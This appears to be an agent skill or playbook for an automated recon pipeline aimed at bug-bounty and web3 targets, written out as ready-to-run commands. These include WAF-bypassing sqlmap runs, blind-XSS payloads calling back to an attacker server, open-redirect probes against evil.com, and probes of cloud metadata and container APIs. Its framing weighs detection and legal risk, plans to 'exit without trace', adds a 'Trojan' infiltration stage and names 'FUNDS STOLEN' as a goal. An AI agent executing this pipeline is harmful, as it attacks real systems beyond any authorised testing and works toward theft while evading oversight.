# RECON PIPELINE — Phase-by-Phase Methodology
# wadgamer10 pipeline hardened with SOUL.md Calculus + Core Loop

---

## OVERVIEW

```
SCOPE → PHASE 0 (Eliminate) → PHASE 1 (Trace) → PHASE 2 (Trace) → PHASE 3 (Walk) → PHASE 4/5 (Loop/Deep/Trojan)
```

Each phase: **Input → Calculus Filter → Tool Execution → Blind Spot Check → Structured Output → Next Phase**

---

## PHASE 0: SCOPE & ELIMINATE (The Brain)

### Input
- Program scope (Immunefi, H1, BC, etc.)
- Chain(s), contract addresses
- Bounty max, asset types

### Actions
1. **Parse scope** → `targets.yaml`
2. **Calculus per target:**
   ```
   Value = Bounty max × Exploitability × Asset criticality
   Cost = Tool time + Gas + Capital
   Risk = Detection prob + Legal + Reputation
   Irreversibility = Can we cleanup?
   Clean = Exit without trace?
   Fallback = Plan B if primary fails?
   ```
3. **Eliminate:** Drop targets where `Value ≤ Cost + Risk + Irreversibility`
4. **Rank remaining** by Calculus score
5. **Blind Spot Check:** What did scope NOT cover? Internal contracts? Off-chain? Governance? Oracle?

### Output
- `targets.yaml` (ranked, with Calculus scores)
- `assumptions.log` (eliminated targets + reasons)

---

## PHASE 1: SUBDOMAIN ENUMERATION (Passive → Active)

### Input
- `targets.yaml` (domains)

### Calculus Gate
- Passive: Always run (Cost=Low, Risk=Zero)
- Active (bruteforce): Only if `Value > Cost + Risk` for hidden assets

### Pipeline
```
subfinder (all sources) → anew subs.txt
amass (passive) → anew subs.txt
assetfinder → anew subs.txt
crt.sh → anew subs.txt
github-subdomains → anew subs.txt

cat subs.txt | puredns resolve → resolved.txt
cat resolved.txt | httpx -mc 200,301,302,403,401 -title -tech → live.txt
```

### Active (gated)
```
puredns bruteforce best-dns-wordlist.txt target.com resolvers.txt → anew subs.txt
# Re-resolve + re-httpx
```

### Takeover Check
```
subzy --targets live.txt
nuclei -l live.txt -t takeovers/
```

### Blind Spot Check
- Wildcard subdomains?
- Internal hostnames (internal., corp., staging., dev.)?
- Cloud metadata endpoints?
- CDN edges?

### Output
- `subs.txt`, `resolved.txt`, `live.txt`, `takeover.txt`, `nuclei-exposures.txt`

---

## PHASE 2: URL & PARAMETER HARVEST

### Input
- `live.txt`

### Pipeline
```
waymore -mode U → urls.txt
gau → anew urls.txt
katana -jc -kf all → anew urls.txt
github-endpoints (if token) → anew urls.txt

cat urls.txt | uro → urls-dedup.txt
cat urls-dedup.txt | httpx -mc 200 → live-urls.txt
cat live-urls.txt | grep "=" → params.txt
cat live-urls.txt | grep "\.js$" | httpx -mc 200 → js-files.txt
```

### Calculus Filter (Tag high-value params)
```
grep -iE "(auth|login|signin|password|token|key|secret|wallet|payment|swap|bridge|stake|contract|withdraw|deposit|transfer|mint|burn|govern|vote|dao|oracle|price)" params.txt → high-value-params.txt
```

### Blind Spot Check
- URLs without params (path-based vulns)?
- API endpoints (GraphQL, REST, gRPC)?
- WebSocket endpoints?
- Non-HTML content (JSON, XML, PDF)?

### Output
- `urls.txt`, `live-urls.txt`, `params.txt`, `js-files.txt`, `high-value-params.txt`

---

## PHASE 3: JS HUNTING (Client-Side Trust Gaps)

### Input
- `js-files.txt`

### Pipeline
```
cat js-files.txt | jscracker → js-secrets.txt
nuclei -l js-files.txt -t exposures/ -t fuzzing/ → nuclei-js.txt
# Manual grep for:
# - API keys, secrets, tokens
# - Internal endpoints (/admin, /internal, /debug, /api/internal)
# - GraphQL schemas
# - Feature flags
# - WebSocket endpoints
# - postMessage handlers
```

### Blind Spot Check
- Source maps (.map files)?
- Minified vs original?
- Third-party scripts (analytics, chat, payments)?
- Service workers?
- WASM modules?

### Output
- `js-secrets.txt`, `nuclei-js.txt`, `js-endpoints.txt`

---

## PHASE 4: TARGETED VULN SCANNING (Walk Phase)

### Input
- `high-value-params.txt` (Calculus-filtered)
- `live-urls.txt`
- `js-secrets.txt`

### Calculus Gate
**Only scan high-value params.** Skip low-value noise.

### Pipelines

#### XSS
```
cat high-value-params.txt | Gxss -c 100 -p XssReflected | dalfox pipe -b $XSS_SERVER -w 100
cat high-value-params.txt | dalfox pipe -b $XSS_SERVER -blind
```

#### SQLi
```
sqlmap -m high-value-params.txt --batch --random-agent --level 1 --risk 1 --tamper=space2comment --dbs
# WAF bypass
sqlmap -m high-value-params.txt --batch --random-agent --tamper=space2comment,randomcase,between,charencode --level 5 --risk 3 --dbs
```

#### SSTI
```
tplmap -m high-value-params.txt
```

#### CORS
```
cat live-urls.txt | CORS-Scanner
# Manual verify: Origin: evil.com → Credentials: true
```

#### Open Redirect
```
cat live-urls.txt | grep -E "(url|redirect|next|return|goto)=http" | qsreplace "https://evil.com" | xargs -I{} curl -s -L {} -I | grep -i "evil.com"
```

#### SSRF
```
nuclei -l live-urls.txt -t ssrf/
```

#### Subdomain Takeover
```
nuclei -l live.txt -t takeovers/
subzy run --targets live.txt
```

#### Nuclei Targeted
```
nuclei -l live-urls.txt -t vulnerabilities/ -t cves/ -t exposures/ -t misconfiguration/ -t fuzzing-templates/ -t ssl/ -t dns/ -rate-limit 100 -severity critical,high,medium
```

### Blind Spot Check (Post-Scan)
```
# What did tools MISS?
- Business logic flaws (price manipulation, coupon abuse, workflow bypass)
- Race conditions (concurrent withdrawals, double-spend)
- AuthZ bypass (IDOR, horizontal/vertical privilege escalation)
- Chain vulnerabilities (multi-step exploits)
- Off-chain → on-chain (oracle manipulation, signature replay)
- Upgradeability / proxy storage collisions
- Governance attacks (flash loans, vote manipulation)
```

### Output
- `xss-*.txt`, `sqlmap-*/`, `ssti.txt`, `cors*.txt`, `open-redirect.txt`, `ssrf.txt`, `takeover.txt`, `nuclei-targeted.txt`, `vulns-all.txt`, `blind-spots.md`

---

## PHASE 5: INFRASTRUCTURE & ON-CHAIN (Deep Recon)

### Infra (from live IPs)
```
naabu -list live-ips.txt -top-ports 1000 → ports.txt
nmap -sV -sC -p$(cat ports.txt | tr '\n' ',') -iL live-ips.txt
virtual-host-discovery
sslscan / nuclei -t ssl/
cloud metadata checks (169.254.169.254)
k8s/docker API checks (10250, 2375, 6443)
```

### On-Chain (from targets.yaml)
```
# Per contract:
cast code <contract> --rpc-url $RPC
cast storage <contract> 0-49 --rpc-url $RPC
cast 4byte <contract> --rpc-url $RPC
cast call <contract> "owner()(address)" --rpc-url $RPC
cast call <contract> "admin()(address)" --rpc-url $RPC
cast call <contract> "implementation()(address)" --rpc-url $RPC
# ERC20 checks
cast call <contract> "name()(string)" --rpc-url $RPC
cast call <contract> "symbol()(string)" --rpc-url $RPC
cast call <contract> "decimals()(uint8)" --rpc-url $RPC
cast call <contract> "totalSupply()(uint256)" --rpc-url $RPC
# Balances
cast balance <contract> --rpc-url $RPC
cast call <token> "balanceOf(address)(uint256)" <contract> --rpc-url $RPC
```

### Output
- `infra/`, `onchain/`, `exploit-plan.yaml`

---

## DECISION GATES (SOUL Integration)

### After Each Phase
```
ELIMINATE: What can I drop? (Calculus re-check)
TRACE: What trust gaps remain? (Blind Spot Scanner)
WALK: What's the next exploit vector? (Priority by Calculus)
LOOP: If 3+ attempts, no vulns → AUTO-DEEP → AUTO-TROJAN
```

### Auto-Deep Trigger
```
Attempts ≥ 3 AND vulns-all.txt empty → auto-deep.sh
→ 3-scenario simulation (Best / Worst / Adversarial)
→ Pre-commit decisions (Trigger, Owner, Evidence, Max Loss, Fallback, Abort)
→ New plan or ABORT
```

### Auto-Trojan Trigger
```
Direct force failed (no vulns after Deep) → auto-trojan.sh
→ Gatekeeper Model (Who opens? What signal? What reward?)
→ Horse Architecture (Exterior, Acceptance, Hidden Dep, Reveal, Exit)
→ Indirect Victory Protocol (Force/Bypass/Reframe/Incentivize/Embed/Wait)
→ Defense Mirror (Inspection, Disclosure, Rejection, Misuse, Rollback)
→ Trojan Verdict: Proceed only if survives all 5 checks
```

---

## EXECUTION DISCIPLINE

### Every Tool Run
1. Calculus check first
2. Run with structured output
3. Blind Spot check immediately after
4. Log assumptions in `assumptions.log`
5. Feed output to next phase

### No Spray-and-Pray
- `nuclei -l live.txt -t all-templates` = BANNED
- `sqlmap -m all-params.txt` = BANNED
- `dalfox file all-urls.txt` = BANNED

### Report Format (Per Finding)
```yaml
finding:
  target: "api.target.com"
  vector: "SQLi in /api/v1/users?id="
  type: "Time-based blind SQLi"
  evidence: "sqlmap output + manual verify curl"
  impact: "Full user DB exfiltration"
  calculus:
    value: 50000
    cost: 30  # minutes
    risk: 2
    clean: true
    fallback: "NoSQL injection in same endpoint"
  blind_spot_check: "Checked: No WAF bypass needed. Assumption: MySQL 5.7. Verified."
  trojan_applicable: false
```

---

## AUTOMATION (Cron/Delegate)

```yaml
# Daily recon on new scopes
cron: "0 6 * * *"
skill: predator-recon
prompt: "Run Phase 0-2 on new Immunefi scopes"
```

---

**Remember:** The pipeline serves the loop. Tools don't find bugs. The loop finds bugs. Tools just gather intel for the loop.

*"Eliminate → Trace → Walk → Loop until TX HASH / WEAK PROVEN / FUNDS STOLEN."*